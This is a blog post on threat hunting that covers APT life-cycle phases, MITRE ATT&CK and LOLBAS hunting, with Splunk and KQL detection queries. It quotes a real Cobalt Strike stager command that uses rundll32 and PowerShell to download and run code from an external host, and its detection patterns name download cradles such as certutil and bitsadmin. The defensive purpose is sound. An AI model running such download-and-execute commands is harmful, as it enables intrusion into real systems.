---
title: "Hunting for Evil" 
layout: "post"
---

__Threat__ __hunting__ - the act of aggressively intercepting, tracking and eliminating cyber adversaries as early as possible in the __Cyber__ __Kill__ __Chain__.
To prevent, detect and resolve an __APT__, you must recognize its characteristics. 
Most APTs follow the same basic life cycle of infiltrating a network, expanding access and achieving the goal of the attack, which is most commonly stealing data by extracting it from the network.




1) In the first phase, usually referred to __"Initial__ __Access"__, advanced persistent threats often gain access through social engineering techniques. One indication of an APT is a phishing email that selectively targets high-level individuals like senior executives or technology leaders, often using information obtained from other team members that have already been compromised. Email attacks that target specific individuals are called “spear-phishing.”

2) In the second phase, usually referred to __"Lateral__ __Movement"__ attackers insert malware into an organization’s network to move to the second phase, expansion. They move laterally to map the network and gather credentials such as account names and passwords in order to access critical business information.
Additional entry points are often established to ensure that the attack can continue if a compromised point is discovered and closed.

3) In the third phase, usually referred to __"Exfiltration"__, cybercriminals typically store stolen information in a secure location within the network until enough data has been collected. They then extract, or “exfiltrate” it without detection. 

Threats are human. Focused and funded adversaries will not be countered by security boxes on the network alone. Threat hunters are actively searching for threats to prevent or minimize damage before it happens.


The Threat Hunting concept can be easily summarized with the __Locard's__ __Exchange__ __Principle__, which says that: "Every Contact leave a trace". 
Thinking about our attacker this makes perfect sense.  

<p align="center">
  <img src="/assets/posts/2021-11-01-Hunting-for-Evil/pyramidofpain.JPG">
</p>


## 1) Introduction to Threat hunting 

In traditional security monitoring approach, most of the blue teamers look out for threats based on the alerts being triggered out by SIEM or other security devices.
In addition to alert–driven approach, why can’t we add a continuous process for finding stuff from the data without any alerts driving us for incident. 
That’s the process of Threat hunting, proactively looking out for threats in network. 
Those threats which are not identified by your existing security solutions or attacks which bypassed your solutions can be hunted down using this process.

As a baseline the following steps are needed to perform hunting activities: 

- Develop Hypothesis – Hypothesis means what u want to look for, like looking out for powershell commands making connection to internet etc.
- Gather data – Based on the hypothesis, look out for data you need to collect for hunting.
- Test hypothesis and gather hunting – Once data is collected, look out for threats based on behavior, search queries .
- Automate certain tasks – Threat hunting can never be fully automated but semi-automated.
- Operationalize Threat Hunting – Now, instead of ad-hoc hunting, operationalize your hunting program so that we can perform continuous threat hunting.

Most of the threat hunting platforms uses `“Attack MITRE” adversary model. MITRE ATT&CK™` is a globally-accessible knowledge base of adversary tactics and
techniques based on real-world observations. 

The `Mitre` team has listed down all those adversary behaviors and attack vectors carries out by an adversary on a victim machine. 
It provides you with description as well as some references regarding the threats, based on historical outbreak. 
It uses `TTP’s Tactics, Techniques and Procedures` and maps it to __Cyber__ __Kill__ __chain__.




Below some basic example of practical threat hunting approach based on hypothesis.

- `Word.exe` or `excel.exe` file opening powershell which runs `mimikatz` command for hash dumping – To check this hypothesis, first look for data, do we have
proper data to hunt for this hypothesis, then hunt for __winword.exe__ __execl.exe__ process creating __powershell.exe__, and command line containing (
`mimikatz`).

- Downloading files from internet (Other than browser) – Look out for process which are used to download files from internet other than browser,
`certutil.exe` , `hh.exe` can be used for the same.

- `Powershell download cradles` event_data.CommandLine:(*powershell* *pwsh* *SyncAppvPublishingServer*) AND event_data.CommandLine:(*BitsTransfer* *webclient* *DownloadFile* *downloadstring* *wget* *curl* *WebRequest* *WinHttpRequest* iwr irm "*internetExplorer.Application*" "*Msxml2.XMLHTTP*" "*MsXml2.ServerXmlHttp*")

- Using `certutil,exe` for downloading event_data.CommandLine:(*certutil*) AND event_data.CommandLine:(*urlcach* *url* *ping*) AND event_data.CommandLine:(*http* *ftp*)


__Note:__ Testing 


## 2) Basic LOLBAS Hunting with Splunk 

The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.

- General term used when an attacker abuses built-in binaries and scripts of an OS install or common application installation
- These techniques may be harder to detect, evade controls, blend in with normal use etc.
- `LOLBAS` typically provides examples of how these tools are invoked at the command line.

Below some example of typical `LOLBAS` software abused by APT.

- powershell.exe
- bitsadmin.exe
- certutil.exe
- psexec.exe
- wmic.exe
- mshta.exe
- mofcomp.exe
- cmstp.exe
- windbg.exe
- cdb.exe
- msbuild.exe
- csc.exe
- regsvr32.exe

__Note:__ The detections rules listed below are specific to out environment. Always adapt the query according to your needs

In the case study presented below the threat actor uses `Cobalt Strike` beacon for their post-exploitation activities with a __PowerShell__ stager generated from the Cobalt Strike framework.
The telemetry shows this attack launched by abusing `rundll32.exe` and the command line invoking __JScript__ code to download a web page and launch the initial __PowerShell__ stager.

```js
rundll32.exe javascript:\\..\\mshtml,RunHTMLApplication ;document.write();new%20ActiveXObject(WScript.Shell).Run(powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('hxxps://stjohnplece.co/lll/webax.js');
```

The first PowerShell stage, webax.js decompresses the second-stage PowerShell code that loads the first shellcode stage into memory and creates a specific request to download what seems like a standard jQuery library.


### 1) Bitsadmin Download File

The following query identifies Microsoft Background Intelligent Transfer Service utility bitsadmin.exe using the transfer parameter to download a remote object. 
In addition, look for download or upload on the command-line, the switches are not required to perform a transfer.

```powershell 
bitsadmin download activity:

	DeviceProcessEvents
	| where ProcessVersionInfoOriginalFileName == "bitsadmin.exe"
	| where ProcessCommandLine contains "/addfile" or "transfer"
	
bitsadmin create a persistent job activity:

	DeviceProcessEvents
	| where ProcessVersionInfoOriginalFileName == "bitsadmin.exe"
	| where ProcessCommandLine contains "/SetNotifyCmdLine"


```

# 1) powershell

# 2) rundll32

# 3) mshta

The following analytic identifies "mshta.exe" execution with inline protocol handlers. "JavaScript", "VBScript", and "About" are the only supported options when invoking HTA content directly on the command-line.

```powershell
| tstats `security_content_summariesonly` count values(Processes.process) as process values(Processes.parent_process) as parent_process min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where `process_mshta` (Processes.process=*vbscript* OR Processes.process=*javascript* OR Processes.process=*about*) by Processes.user Processes.process_name Processes.original_file_name Processes.parent_process_name Processes.dest  | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`| `security_content_ctime(lastTime)` | `detect_mshta_inline_hta_execution_filter`
```


# 4) Certutil Download With Urlcache And Split Arguments

Certutil.exe may download a file from a remote destination using -urlcache. This behavior does require a URL to be passed on the command-line. In addition, -f (force) and -split (Split embedded ASN.1 elements, and save to files) will be used.

```powershell
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where `process_certutil` Processes.process=*urlcache* Processes.process=*split* by Processes.dest Processes.user Processes.parent_process Processes.process_name Processes.process Processes.process_id Processes.original_file_name Processes.parent_process_id | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)` | `certutil_download_with_urlcache_and_split_arguments_filter`
```